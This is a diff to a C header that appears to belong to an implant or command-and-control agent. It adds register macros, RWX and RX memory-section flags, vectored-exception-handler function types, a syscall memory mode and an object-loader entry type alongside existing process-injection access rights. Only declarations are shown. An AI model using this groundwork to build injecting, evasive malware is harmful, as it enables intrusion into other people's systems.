@@ -66,6 +66,7 @@ EXTERN_C LPVOID InstEnd();
 #define IMAGE_REL_TYPE(x, y)  					IMAGE_REL_##x##_##y
 
 #ifdef _M_X64
+	#define IP_REG								Rip
 	#define ENTRYPOINT_REG 						Rcx
 	#define PTR_MASK                    		0x7FFFFFFF
 	#define PEB_POINTER     					PEB_POINTER64
@@ -80,6 +81,7 @@ EXTERN_C LPVOID InstEnd();
 	#define COFF_PREP_BEACON_SIZE   			(COFF_PREP_SYMBOL_SIZE + 6)
 	#define GLOBAL_CONTEXT           			0xbfded9c9  // .refptr.__instance
 #elif _M_IX86
+	#define IP_REG								Eip
 	#define ENTRYPOINT_REG 						Eax
 	#define PTR_MASK                    		0x7FFF
 	#define PEB_POINTER     					PEB_POINTER32
@@ -101,6 +103,10 @@ EXTERN_C LPVOID InstEnd();
 #define SMB_RID_SINGLE_MANDATORY_LOW			SECURITY_MANDATORY_LOW_RID, 0, 0, 0, 0, 0, 0, 0
 #define PROCESS_CREATE_ALL_ACCESS_SUSPEND		PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, nullptr, nullptr, NULL, THREAD_CREATE_FLAGS_CREATE_SUSPENDED
 #define ACCESS_VEH 								(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD)
+#define IMAGE_SCN_MEM_RWX						(IMAGE_SCN_MEM_EXECUTE |IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)
+#define IMAGE_SCN_MEM_RW						(IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE)
+#define IMAGE_SCN_MEM_RX						(IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE)
+#define IMAGE_SCN_MEM_XCOPY						(IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE)
 
 #define UNMANAGED_PROCESS   					0
 #define MANAGED_PROCESS     					1
@@ -166,16 +172,19 @@ typedef NTSTATUS(NTAPI* RtlDestroyProcessParameters_t)(PRTL_USER_PROCESS_PARAMET
 typedef NTSTATUS (NTAPI* RtlGetVersion_t)(PRTL_OSVERSIONINFOW lpVersionInformation);
 typedef ULONG (NTAPI* RtlRandomEx_t)(PULONG Seed);
 
+typedef PVOID (NTAPI* RtlAddVectoredExceptionHandler_t)(ULONG First, PVECTORED_EXCEPTION_HANDLER Handler);
+typedef ULONG (NTAPI* RtlRemoveVectoredExceptionHandler_t)(PVOID Handle);
 typedef NTSTATUS(NTAPI* NtGetContextThread_t)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
 typedef NTSTATUS(NTAPI* NtSetContextThread_t)(HANDLE ThreadHandle, PCONTEXT ThreadContext);
 typedef NTSTATUS(NTAPI* NtResumeThread_t)(HANDLE hThr, PULONG PrviousSuspendCount);
 typedef NTSTATUS(NTAPI* NtWaitForSingleObject_t)(HANDLE Handle, BOOLEAN Alertable, ULONG Timeout);
 typedef NTSTATUS(NTAPI* NtClose_t)(HANDLE hObject);
 typedef VOID(NTAPI* RtlInitUnicodeString_t)(PUNICODE_STRING Destinationstring, PCWSTR Sourcestring);
-typedef NTSTATUS (NTAPI* NtTestAlert_t)(VOID);
+typedef NTSTATUS (NTAPI* NtTestAlert_t)(void);
 typedef NTSTATUS (NTAPI* TpAllocWork_t)(PTP_WORK* ptpWork, PTP_WORK_CALLBACK callback, PVOID optArgs, PTP_CALLBACK_ENVIRON cbEnviron);
 typedef VOID (NTAPI* TpPostWork_t)(PTP_WORK ptpWork);
 typedef VOID (NTAPI* TpReleaseWork_t)(PTP_WORK ptpWork);
+
 
 
 WEAK EXTERN_C uint32_t		__instance;
@@ -231,6 +240,12 @@ enum MessageType {
 	TypeSegment     = 0x7FFFFFFC,
     TypeExecute     = 0x7FFFFFFB,
     TypeObject		= 0x7FFFFFFA,
+};
+
+enum DX_MEMORY {
+	DX_MEM_DEFAULT  = 0,
+	DX_MEM_WIN32    = 1,
+	DX_MEM_SYSCALL  = 2,
 };
 
 struct _object_map {
@@ -359,6 +374,8 @@ typedef struct {
 
 
 typedef void (*_command)(_parser *args);
+typedef void (*obj_entry)(char* args, uint32_t size);
+
 struct _command_map{
 	char    	*name;
 	_command 	address;
@@ -493,6 +510,9 @@ struct _hexane{
 		RtlFreeHeap_t RtlFreeHeap;
 		RtlDestroyHeap_t RtlDestroyHeap;
 		RtlInitUnicodeString_t RtlInitUnicodeString;
+
+		RtlAddVectoredExceptionHandler_t RtlAddVectoredExceptionHandler;
+		RtlRemoveVectoredExceptionHandler_t RtlRemoveVectoredExceptionHandler;
 
 		RtlRandomEx_t RtlRandomEx;
 		NtResumeThread_t NtResumeThread;
